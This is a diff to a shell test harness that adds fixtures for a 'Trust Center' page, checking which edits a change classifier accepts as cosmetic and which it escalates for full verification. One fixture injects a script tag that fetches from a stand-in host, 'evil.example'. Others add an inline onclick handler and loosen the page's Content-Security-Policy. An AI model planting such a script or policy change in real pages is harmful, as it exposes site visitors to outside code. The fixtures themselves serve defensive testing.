@@ -142,6 +142,17 @@ fx_integrity()       { py_sub web/index.html 'integrity="sha384-6Zl0Pc8zjSz8KvmN
                               'integrity="sha384-6Zl0Pc8zjSz8KvmNeXRvUQgY4ryFb+BwDvKCmLYcBME0joAaru491tQgi9B7zsMA"'; }
 fx_small_png()       { make_png web/og-airdrop.png 100 100; }
 
+# ---- the Trust Center ---------------------------------------------------------------------------------
+# It is a generated page with no script in it, so the things that can go wrong are different: copy and the
+# hand-written JSON beside it are free, and anything that could execute, or a weakened policy, is not.
+fx_trust_copy()      { py_sub web/trust.html 'Nothing here is financial advice.' 'Nothing on this page is financial advice.'; }
+fx_trust_faq()       { py_sub docs/trust/faq.json 'Why use BulkSend?' 'Why would anyone use BulkSend?'; }
+fx_trust_script()    { py_sub web/trust.html '</main>' '<script>fetch("//evil.example/")</script></main>'; }
+fx_trust_csp()       { py_sub web/trust.html "style-src 'unsafe-inline'" "style-src 'unsafe-inline' https://fonts.googleapis.com"; }
+fx_trust_onclick()   { py_sub web/trust.html '<section id="glance"' '<section onclick="void 0" id="glance"'; }
+fx_trust_builder()   { printf '\n# a note added by a fixture\n' >> deploy/build-trust.py; }
+fx_trust_small_png() { make_png web/og-trust.png 600 315; }
+
 # ---- the runner ------------------------------------------------------------------------------------------
 # want = the verdict the last line must be. needle = text the reason lines must contain, so a fixture cannot
 # pass on the right verdict for the wrong reason. A PRESENTATION_ONLY fixture asserts no reason at all.
@@ -187,9 +198,16 @@ fixture "a different valid 1200x630 og-airdrop.png"             PRESENTATION_ONL
 fixture "the wording of a trailing // comment in the script"    PRESENTATION_ONLY "" fx_comment_text
 fixture "an edit to docs/harness.md"                            PRESENTATION_ONLY "" fx_docs_edit
 fixture "a new <meta property=\"og:locale\"> tag"               PRESENTATION_ONLY "" fx_new_meta
+fixture "a copy change in the Trust Center"                     PRESENTATION_ONLY "" fx_trust_copy
+fixture "an edit to docs/trust/faq.json"                        PRESENTATION_ONLY "" fx_trust_faq
 
 echo
 echo "== changes that must go through ./verify.sh =="
+fixture "a <script> tag added to the Trust Center"  FULL_VERIFY_REQUIRED "web/trust.html contains a <script tag"                fx_trust_script
+fixture "the Trust Center's CSP meta changed"       FULL_VERIFY_REQUIRED "web/trust.html Content-Security-Policy meta is not the one the worker sends" fx_trust_csp
+fixture "an onclick attribute added to the Trust Center" FULL_VERIFY_REQUIRED "web/trust.html contains an inline event-handler attribute" fx_trust_onclick
+fixture "deploy/build-trust.py edited"              FULL_VERIFY_REQUIRED "escalate: deploy/build-trust.py changed"              fx_trust_builder
+fixture "og-trust.png replaced with a 600x315 PNG"  FULL_VERIFY_REQUIRED "web/og-trust.png is 600x315"                          fx_trust_small_png
 fixture "LIVE_CHAINS edited"                     FULL_VERIFY_REQUIRED "web/index.html inline script differs outside comments" fx_live_chains
 fixture "a bulk: '0x…' address edited"           FULL_VERIFY_REQUIRED "web/index.html inline script differs outside comments" fx_bulk_address
 fixture "the two options of #net swapped"        FULL_VERIFY_REQUIRED 'web/index.html the <select id="net"> element changed'  fx_swap_options
